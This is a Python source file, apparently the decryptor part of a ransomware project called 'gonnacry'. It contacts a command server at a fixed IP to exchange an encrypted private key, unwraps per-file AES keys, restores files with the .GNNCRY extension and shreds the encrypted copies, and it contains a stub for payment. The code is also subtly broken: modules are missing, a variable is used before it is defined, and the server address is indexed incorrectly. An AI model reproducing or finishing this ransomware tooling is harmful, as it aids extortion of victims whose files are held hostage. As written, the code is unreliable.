#!/bin/bash/env python
# coding=UTF-8

import enviroment
import requests 
import base64
from Crypto.PublicKey import RSA
import symmetric
import time

ransomware_name = ("gonnacry")
server_address = ("123.123.123.123")


def shred(file_name,  passes=1):

    def generate_data(length):
        chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
        return ''.join(random.SystemRandom().choice(chars) for _ in range(length))

    if not os.path.isfile(file_name):
        print(file_name + " is not a file.")
        return False

    ld = os.path.getsize(file_name)
    fh = open(file_name,  "w")
    for _ in range(int(passes)):
        data = generate_data(ld)
        fh.write(data)
        fh.seek(0,  0)

    fh.close()
    os.remove(file_name)


def send_to_server_encrypted_private_key(id, private_encrypted_key):
    encoded = base64.b64encode(private_encrypted_key)
    address = server_address[0] + '/' + id
    
    try:
        retorno = requests.post(address, encoded)
    except Exception as e:
        raise e

    private_key = retorno.text()
    with open("private_key", 'w') as f:
        f.write(str(private_key))

    return str(private_key)


def payment():
    pass


def menu():
    
    # enviroment paths
    home = enviroment.get_home_path()
    desktop = enviroment.get_desktop_path()
    username = enviroment.get_username()
    ransomware_path = os.path.join(home, ransomware_name[0])
    id = enviroment.get_unique_machine_id()

    

    # import the private key
    with open("private_key") as f:
        private_key = f.read()
    Client_private_key = RSA.importKey(private_key)

    
    # GET THE AES KEYS
    with open(ransomware_path + "AES_encrypted_keys") as f:
        content = f.read()
     
    # get the aes keys and IV's and paths back
    content = content.split('\n')
    aes_and_path = []
    for line in content:
        ret = line.split(' ') # KEY base64(PATH)
        encrypted_aes_key = ret[0]
        aes_key = Client_private_key.decrypt(encrypted_aes_key)

        aes_and_path.append((aes_key, base64.b64decode(ret[1])))

    for _ in aes_and_path:
        dec = symmetric.AESCipher(_[0])
        
        with open(_[1], 'rb') as f:
            encrypted_file_content = f.read()
        
        # decrypt content
        decrypted_file_content = dec.decrypt(encrypted_file_content)

        # save into new file without .GNNCRY extension
        old_file_name = _[1].replace(".GNNCRY", "")
        with open(old_file_name, 'w') as f:
            f.write(decrypted_file_content)
        
        # delete old encrypted file
        shred(_[1])

    # end of decryptor

if __name__ == "__main__": 
    while True:
        try:
            # send to server encrypted private key to be decrypted
            send_to_server_encrypted_private_key(id)
            
            # if succeed, break and go for decryption
            break
        except:
            print("No connection, sleeping for 2 minutes")
            time.sleep(120)


            
    menu()